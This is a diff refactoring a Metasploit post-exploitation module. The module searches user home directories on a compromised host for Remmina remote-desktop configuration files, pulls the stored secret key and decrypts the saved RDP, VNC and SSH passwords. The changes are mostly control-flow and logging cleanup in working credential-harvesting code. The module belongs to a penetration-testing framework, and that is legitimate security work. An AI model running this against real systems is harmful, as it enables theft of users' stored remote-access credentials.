@@ -1,6 +1,6 @@
 # encoding: binary
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -30,8 +30,8 @@ class Metasploit3 < Msf::Post
   def run
     creds = extract_all_creds
     creds.uniq!
-    if creds.empty? == 0
-      print_status('No Reminna credentials collected')
+    if creds.empty?
+      vprint_status('No Reminna credentials collected')
     else
       vprint_good("Collected #{creds.size} sets of Remmina credentials")
       cred_table = Rex::Ui::Text::Table.new(
@@ -70,43 +70,39 @@ class Metasploit3 < Msf::Post
     user_dirs = enum_user_directories
     if user_dirs.empty?
       print_error('No user directories found')
-    else
-      vprint_status("Searching for Remmina creds in #{user_dirs.size} user directories")
-      # walk through each user directory
-      enum_user_directories.each do |user_dir|
-        remmina_dir = ::File.join(user_dir, '.remmina')
-        pref_file = ::File.join(remmina_dir, 'remmina.pref')
-        next unless file?(pref_file)
+      return
+    end
 
-        remmina_prefs = get_settings(pref_file)
-        if remmina_prefs.empty?
-          print_error("Unable to extract Remmina settings from #{pref_file}")
-          next
-        end
+    vprint_status("Searching for Remmina creds in #{user_dirs.size} user directories")
+    # walk through each user directory
+    enum_user_directories.each do |user_dir|
+      remmina_dir = ::File.join(user_dir, '.remmina')
+      pref_file = ::File.join(remmina_dir, 'remmina.pref')
+      next unless file?(pref_file)
 
-        secret = remmina_prefs['secret']
-        if secret
-          vprint_status("Extracted secret #{secret} from #{pref_file}")
-        else
-          print_error("No Remmina secret key found in #{pref_file}")
-          next
-        end
+      remmina_prefs = get_settings(pref_file)
+      next if remmina_prefs.empty?
 
-        # look for any  \d+\.remmina files which contain the creds
-        cred_files = []
-        dir(remmina_dir).each do |entry|
-          if entry =~ /^\d+\.remmina$/
-            cred_files << ::File.join(remmina_dir, entry)
-          end
-        end
+      if (secret = remmina_prefs['secret'])
+        vprint_status("Extracted secret #{secret} from #{pref_file}")
+      else
+        print_error("No Remmina secret key found in #{pref_file}")
+        next
+      end
 
-        if cred_files.empty?
-          vprint_status("No Remmina credential files in #{remmina_dir}")
-        else
-          creds |= extract_creds(secret, cred_files)
-        end
+      # look for any  \d+\.remmina files which contain the creds
+      cred_files = dir(remmina_dir).map do |entry|
+        ::File.join(remmina_dir, entry) if entry =~ /^\d+\.remmina$/
+      end
+      cred_files.compact!
+
+      if cred_files.empty?
+        vprint_status("No Remmina credential files in #{remmina_dir}")
+      else
+        creds |= extract_creds(secret, cred_files)
       end
     end
+
     creds
   end
 
@@ -114,10 +110,7 @@ class Metasploit3 < Msf::Post
     creds = []
     files.each do |file|
       settings = get_settings(file)
-      if settings.empty?
-        print_error("No settings found in #{file}")
-        next
-      end
+      next if settings.empty?
 
       # get protocol, host, user
       proto = settings['protocol']
@@ -135,6 +128,8 @@ class Metasploit3 < Msf::Post
           user = domain + '\\' + settings['username']
         end
       when 'SFTP', 'SSH'
+        # XXX: in my testing, the box to save SSH passwords was disabled
+        # so this may never work
         user = settings['ssh_username']
         port = 22
       else
@@ -144,10 +139,8 @@ class Metasploit3 < Msf::Post
 
       # get the password
       encrypted_password = settings['password']
-      if encrypted_password.blank?
-        # in my testing, the box to save SSH passwords was disabled.
-        password = nil
-      else
+      password = nil
+      unless encrypted_password.blank?
         password = decrypt(secret, encrypted_password)
       end
 
@@ -161,6 +154,7 @@ class Metasploit3 < Msf::Post
         vprint_error("No #{missing.join(',')} in #{file}")
       end
     end
+
     creds
   end
 
@@ -171,6 +165,8 @@ class Metasploit3 < Msf::Post
         settings[Regexp.last_match(1)] = Regexp.last_match(2)
       end
     end
+
+    vprint_error("No settings found in #{file}") if settings.empty?
     settings
   end
 end
